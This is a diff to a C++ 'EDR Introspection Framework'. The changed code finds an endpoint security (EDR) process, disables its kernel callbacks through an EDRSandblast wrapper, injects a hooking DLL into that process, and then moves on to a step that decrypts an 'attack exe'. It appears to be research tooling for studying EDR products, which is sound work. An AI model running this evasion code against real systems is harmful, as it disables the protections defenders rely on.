@@ -78,6 +78,15 @@ void process_results(std::string output, bool dump_sig) {
     std::cout << "[*] EDRi: Done\n";
 }
 
+void inject_hooker(int edr_pid, std::string main_edr_exe) {
+    std::cout << "[+] EDRi: Injecting the hooker dll into " << edr_pid << ":" << main_edr_exe << "\n";
+    if (!inject_dll(edr_pid, get_hook_dll_path())) {
+        std::cerr << "[!] EDRi: Failed to inject the hooker dll into " << main_edr_exe << "\n";
+        stop_all_etw_traces();
+        exit(1);
+    }
+}
+
 int main(int argc, char* argv[]) {
     cxxopts::Options options("EDRi", "EDR Introspection Framework");
     
@@ -265,22 +274,32 @@ int main(int argc, char* argv[]) {
             return 1;
         }
 		std::cout << "[*] EDRi: Found the EDR process " << main_edr_exe << " with PID " << edr_pid << "\n";
-        if (!disable_kernel_callbacks()) {
-            std::cerr << "[!] EDRi: Failed to disable kernel callbacks\n";
-            stop_all_etw_traces();
-			return 1;
-        }
-		std::cout << "[+] EDRi: Disabled kernel callbacks. Injecting the hooker dll into " << edr_pid << ":" << main_edr_exe << "\n";
-        if (!inject_dll(edr_pid, get_hook_dll_path())) {
-            std::cerr << "[!] EDRi: Failed to inject the hooker dll into " << main_edr_exe << "\n";
-			enable_kernel_callbacks(); // try to re-enable callbacks (cleanup)
+		RETURN_CODE ret = disable_wait_enable_kernel_callbacks();
+        switch (ret)
+        {
+        case SUCCESS_NO_WAIT:
+			std::cout << "[+] EDRi: No callbacks found, continuing...\n";
+            inject_hooker(edr_pid, main_edr_exe);
+            break;
+        case SUCCESS_WAIT:
+			std::cout << "[+] EDRi: Callbacks disabled, continuing...\n";
+            inject_hooker(edr_pid, main_edr_exe);
+			Sleep(30 * 1000); // wait for callbacks to be enabled again
+			std::cout << "[+] EDRi: Re-enabled kernel callbacks, continuing...\n"; // TODO check output of sandblast again
+            break;
+        case FAILED:
+			std::cerr << "[!] EDRi: Failed to disable kernel callbacks, cannot continue\n";
             stop_all_etw_traces();
             return 1;
+        case TIMEOUT:
+            std::cerr << "[!] EDRi: Unexpected timeout at EDRSandblast, check EDRSandblast manually, cannot continue\n";
+            stop_all_etw_traces();
+            return 1;
+        default:
+            break;
         }
-        std::cout << "[+] EDRi: Hooking ntdll.dll of " << main_edr_exe << " successful\n";
-		Sleep(2000); // wait a bit until the dll is loaded
-        enable_kernel_callbacks();
     }
+    // TODO check if the hooked process emited etw events
 
     // ATTACK
 	// decrypt the attack exe
